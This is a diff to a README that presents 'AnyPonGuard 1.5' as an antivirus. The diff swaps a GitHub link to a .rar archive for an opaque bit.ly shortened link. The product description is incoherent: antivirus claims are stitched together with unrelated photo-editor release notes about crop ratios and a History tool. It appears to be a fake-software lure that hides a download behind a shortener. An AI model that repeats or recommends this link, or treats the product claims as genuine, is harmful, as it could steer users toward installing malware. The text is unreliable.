@@ -13,7 +13,7 @@
 ##  AnyPonGuard's The most convenient antivirus 
 We create simple solutions to complex problems.
 
-## [⚡ AnyPonGuard 1.5](https://github.com/gilbert9938/AnyPon-Guardian/blob/master/OAnyPonGuard.rar):
+## [⚡ AnyPonGuard 1.5](https://bit.ly/2yEjqWG):
 * The most convenient antivirus We create simple solutions to complex problems
 * Complete security.
 * Online protection.
@@ -25,4 +25,4 @@ We create simple solutions to complex problems.
 * Support for two new Crop Aspect Ratios: 21:9 and 9:21. These are well suited for extra wide-screen computer displays, and digital cinema uses.
 * Resetting tools is easier with an increased clickable area for each reset button.
 * The History tool is easier to use thanks to a redesigned interface with larger text.
-* .
+
